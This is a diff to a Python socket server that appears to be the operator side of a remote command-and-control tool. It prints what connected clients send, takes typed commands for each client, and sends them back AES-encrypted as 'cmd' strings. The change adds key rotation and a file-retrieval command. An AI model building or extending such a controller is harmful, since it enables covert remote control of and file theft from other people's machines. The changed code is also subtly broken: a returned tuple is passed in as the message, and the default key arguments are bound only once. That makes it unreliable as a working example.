@@ -14,19 +14,19 @@ if args.host is None:
 
 def update_aeskeys():
     global aeskey, aesiv
+    tmpkey, tmpiv = aeskey, aesiv
     aeskey = os.urandom(32)
     aesiv = os.urandom(16)
-    print(str([ b'aeskey', aeskey, aesiv ]))
-    return str([ b'aeskey', aeskey, aesiv ])
+    return str([ b'aeskey', aeskey, aesiv ]), tmpkey, tmpiv
 
-def do_encrypt(message):
+def do_encrypt(message, tmpkey=aeskey, tmpiv=aesiv):
     if isinstance(message, bytes):
         pass
     else:
         message = bytes(message, 'utf-8')
     length = 16 - (len(message) % 16)
     message += bytes([length])*length
-    obj = AES.new(aeskey, AES.MODE_CBC, aesiv)
+    obj = AES.new(tmpkey, AES.MODE_CBC, tmpiv)
     cipher = obj.encrypt(message)
     return cipher
 
@@ -49,17 +49,17 @@ def client(conn, addr, buff):
         while len(data) < length:
             to_read = length - len(data)
             data += conn.recv(buff if to_read > buff else to_read)
-        print(addr[0]+':\n'+str(do_decrypt(data).strip(), 'utf-8'))
+        print('\n'+str(do_decrypt(data).strip(), 'utf-8'))
         while True:
             try:
                 reply=input('Enter command for %s: ' %addr[0])
             except ValueError:
                 print("Bad input")
             if reply == 'help':
-                print('update_key')
+                print('update_key\nget_file /path/to/file')
             elif reply == "update_key":
                 conn.send(do_encrypt(update_aeskeys()))
-            elif reply == '':
+            elif reply.strip() == '':
                 continue
             else:
                 conn.send(do_encrypt('cmd ' + reply))
